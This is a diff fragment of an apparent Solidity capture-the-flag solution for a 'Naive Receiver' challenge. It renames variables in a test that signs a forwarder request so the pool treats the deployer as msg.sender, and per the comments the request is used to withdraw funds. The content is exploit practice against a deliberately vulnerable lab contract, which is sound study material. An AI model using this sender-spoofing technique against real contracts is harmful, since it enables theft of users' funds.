@@ -119,7 +119,7 @@ contract NaiveReceiverChallenge is Test {
         );
 
         // we need to forward the request to the pool so we can trick the pool to think that the deployer is the msg.sender
-        BasicForwarder.Request memory request = BasicForwarder.Request({
+        BasicForwarder.Request memory withdrawRequest = BasicForwarder.Request({
             from: address(player),
             target: address(pool),
             value: 0,
@@ -130,7 +130,7 @@ contract NaiveReceiverChallenge is Test {
         });
 
         // These are straight forward things to create the signature and forward the request to the pool
-        bytes32 requestHash = forwarder.getDataHash(request);
+        bytes32 requestHash = forwarder.getDataHash(withdrawRequest);
 
         // Manually construct the EIP-712 typed data hash
         bytes32 domainSeparator = forwarder.domainSeparator();
@@ -141,9 +141,9 @@ contract NaiveReceiverChallenge is Test {
         // I want to sign the requestHash with the player's private key
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
 
-        bytes memory signature = abi.encodePacked(r, s, v);
+        bytes memory playerSignature = abi.encodePacked(r, s, v);
 
-        forwarder.execute(request, signature);
+        forwarder.execute(withdrawRequest, playerSignature);
     }
 
     /**
